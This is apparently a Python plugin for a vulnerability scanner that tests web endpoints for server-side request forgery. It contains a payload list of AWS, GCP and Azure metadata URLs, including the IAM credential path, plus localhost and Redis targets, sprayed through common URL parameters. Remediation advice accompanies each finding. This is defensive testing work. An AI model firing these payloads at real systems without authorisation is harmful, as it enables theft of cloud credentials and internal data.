"""
SSRF Deep Scanner — Cloud Metadata
Tests for Server-Side Request Forgery targeting cloud metadata endpoints
(AWS, GCP, Azure) and internal services.
"""
import asyncio
import json
import re
import ssl
import urllib.parse

from app.scanner.plugins.base import Plugin, PluginMeta, PluginResult, Finding
from app.scanner.context import stable_fingerprint

META = PluginMeta(
    plugin_id="web.ssrf_deep",
    name="SSRF Deep (Cloud Metadata)",
    category="web",
    depends_on=["fingerprint.http"],
    consumes=["fingerprint.http", "net.open_ports", "recon.directories"],
    provides=["web.ssrf_findings"],
    enabled_by_default=True,
    timeout_seconds=35.0,
)

# Cloud metadata URLs to inject
_METADATA_URLS = [
    # AWS IMDSv1
    ("http://169.254.169.254/latest/meta-data/", "AWS", ["ami-id", "instance-id", "hostname", "local-ipv4"]),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM", ["AccessKeyId", "SecretAccessKey"]),
    ("http://169.254.169.254/latest/user-data", "AWS UserData", ["#!/", "cloud-init"]),
    # GCP
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP", ["project-id", "attributes"]),
    ("http://169.254.169.254/computeMetadata/v1/", "GCP Alt", ["project-id"]),
    # Azure
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure", ["compute", "vmId", "subscriptionId"]),
    # Internal services
    ("http://127.0.0.1:80/", "Localhost:80", ["<html", "<body"]),
    ("http://127.0.0.1:8080/", "Localhost:8080", ["<html", "api", "status"]),
    ("http://127.0.0.1:6379/", "Redis", ["REDIS", "redis_version"]),
    ("http://[::1]/", "IPv6 Localhost", ["<html"]),
]

# Parameters that commonly accept URLs (potential SSRF vectors)
_SSRF_PARAMS = [
    "url", "uri", "src", "source", "href", "link", "fetch",
    "proxy", "callback", "redirect", "image", "img", "file",
    "load", "page", "feed", "pdf", "doc", "data", "webhook",
    "api_url", "endpoint", "target", "host", "dest",
]

# Endpoints that might process URLs
_SSRF_ENDPOINTS = [
    "/api/fetch", "/api/proxy", "/api/webhook", "/api/import",
    "/api/preview", "/api/screenshot", "/api/pdf", "/api/url",
    "/fetch", "/proxy", "/webhook", "/preview", "/download",
    "/api/v1/fetch", "/api/v1/proxy", "/api/v1/webhook",
]


async def _http_request(host: str, port: int, method: str, path: str,
                        body: str = "", content_type: str = "application/json",
                        use_tls: bool = False, timeout: float = 5.0) -> tuple[int, str]:
    """Send HTTP request, return (status, body)."""
    try:
        if use_tls:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ssl_ctx), timeout=timeout
            )
        else:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout
            )

        headers = {
            "Host": host,
            "User-Agent": "VulnScan/2.1",
            "Accept": "*/*",
            "Connection": "close",
        }
        if method == "POST":
            headers["Content-Type"] = content_type
            headers["Content-Length"] = str(len(body))

        request = f"{method} {path} HTTP/1.1\r\n"
        request += "".join(f"{k}: {v}\r\n" for k, v in headers.items())
        request += f"\r\n{body}"

        writer.write(request.encode())
        await writer.drain()

        response = await asyncio.wait_for(reader.read(32768), timeout=timeout)
        writer.close()

        text = response.decode("utf-8", errors="ignore")
        parts = text.split("\r\n\r\n", 1)
        header_block = parts[0] if parts else ""
        resp_body = parts[1] if len(parts) > 1 else ""

        status_match = re.match(r"HTTP/\d\.\d\s+(\d+)", header_block)
        status = int(status_match.group(1)) if status_match else 0

        return status, resp_body
    except Exception:
        return 0, ""


class Check(Plugin):
    async def run(self, target: str, ctx) -> PluginResult:
        ports = ctx.get("net.open_ports", []) or []
        http_data = (ctx.get("fingerprint.http", {}) or {}).get("http", [])
        target_raw = ctx.get("target_raw", target)
        directories = ctx.get("recon.directories", []) or []
        findings = []
        ssrf_results = []

        # Determine base URLs
        base_urls = []
        if re.match(r"^https?://", target_raw, re.I):
            base_urls.append(target_raw.rstrip("/"))
        else:
            for item in http_data:
                url = item.get("url", "")
                if url:
                    base_urls.append(url.rstrip("/"))
            if not base_urls:
                web_ports = [p for p in ports if p in (80, 443, 8080, 8443)]
                for p in web_ports[:2]:
                    scheme = "https" if p in (443, 8443) else "http"
                    base_urls.append(f"{scheme}://{target}:{p}")

        if not base_urls:
            return PluginResult(artifacts={"web.ssrf_findings": []})

        for base in base_urls[:2]:
            parsed = urllib.parse.urlparse(base)
            host = parsed.hostname or target
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            use_tls = parsed.scheme == "https"

            # Combine standard endpoints with discovered directories
            test_endpoints = list(_SSRF_ENDPOINTS)
            for d in directories[:10]:
                if any(kw in d.lower() for kw in ["fetch", "proxy", "webhook", "import", "url", "api"]):
                    test_endpoints.append(d)

            for endpoint in test_endpoints:
                # First check if endpoint exists
                status, _ = await _http_request(host, port, "GET", endpoint, use_tls=use_tls)
                if status in (0, 404):
                    continue

                # Test each metadata URL via each parameter
                for meta_url, cloud_name, indicators in _METADATA_URLS[:6]:  # Top 6 metadata URLs
                    for param in _SSRF_PARAMS[:8]:  # Top 8 params
                        # Test via GET parameter
                        test_path = f"{endpoint}?{param}={urllib.parse.quote(meta_url)}"
                        get_status, get_body = await _http_request(
                            host, port, "GET", test_path, use_tls=use_tls
                        )

                        # Test via POST JSON body
                        post_body = json.dumps({param: meta_url})
                        post_status, post_body_resp = await _http_request(
                            host, port, "POST", endpoint, post_body, use_tls=use_tls
                        )

                        # Check both responses for metadata indicators
                        for resp_status, resp_body, method in [
                            (get_status, get_body, "GET"),
                            (post_status, post_body_resp, "POST"),
                        ]:
                            if resp_status not in (200, 201):
                                continue

                            # Check if response contains cloud metadata
                            matched_indicators = [ind for ind in indicators if ind.lower() in resp_body.lower()]

                            if matched_indicators:
                                severity = "critical" if "AccessKeyId" in matched_indicators or "SecretAccessKey" in matched_indicators else "high"
                                fp = stable_fingerprint(target, META.plugin_id, endpoint, param, cloud_name)
                                findings.append(Finding(
                                    severity=severity,
                                    plugin_id=META.plugin_id,
                                    title=f"SSRF to {cloud_name} metadata via {method} {endpoint}?{param}=",
                                    description=(
                                        f"The parameter '{param}' at {endpoint} is vulnerable to SSRF. "
                                        f"The server fetched the {cloud_name} metadata endpoint and returned "
                                        f"cloud infrastructure data. "
                                        + ("This includes IAM credentials that grant full cloud access!"
                                           if severity == "critical" else
                                           "An attacker can access internal services and cloud metadata.")
                                    ),
                                    evidence=(
                                        f"url={base}{endpoint} param={param} method={method} "
                                        f"meta_url={meta_url} cloud={cloud_name} "
                                        f"indicators={matched_indicators} "
                                        f"response_preview={resp_body[:200]}"
                                    ),
                                    affected=target,
                                    fingerprint=fp,
                                    confidence=0.95,
                                    remediation=(
                                        f"[{'CRITICAL' if severity == 'critical' else 'HIGH'}] SSRF to {cloud_name} metadata\n\n"
                                        f"[IMMEDIATE ACTION]\n"
                                        f"1. Block requests to 169.254.169.254 and internal IPs\n"
                                        f"2. Implement URL allowlisting for user-supplied URLs\n"
                                        f"3. Enable IMDSv2 on AWS (requires token-based access)\n\n"
                                        f"[AWS IMDSv2]\n"
                                        f"  aws ec2 modify-instance-metadata-options \\\n"
                                        f"    --instance-id i-xxx --http-tokens required\n\n"
                                        f"[CODE FIX]\n"
                                        f"  - Parse URL and reject: private IPs, localhost, link-local\n"
                                        f"  - Use DNS resolution to check the actual IP before fetching\n"
                                        f"  - Apply network-level egress filtering"
                                    ),
                                    references=[
                                        "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
                                    ],
                                ))
                                ssrf_results.append({
                                    "endpoint": endpoint, "param": param,
                                    "cloud": cloud_name, "method": method,
                                })
                                break  # One confirmed SSRF per endpoint is enough
                        if any(r["endpoint"] == endpoint for r in ssrf_results):
                            break  # Move to next endpoint
                    if any(r["endpoint"] == endpoint for r in ssrf_results):
                        break

        return PluginResult(findings=findings, artifacts={"web.ssrf_findings": ssrf_results})
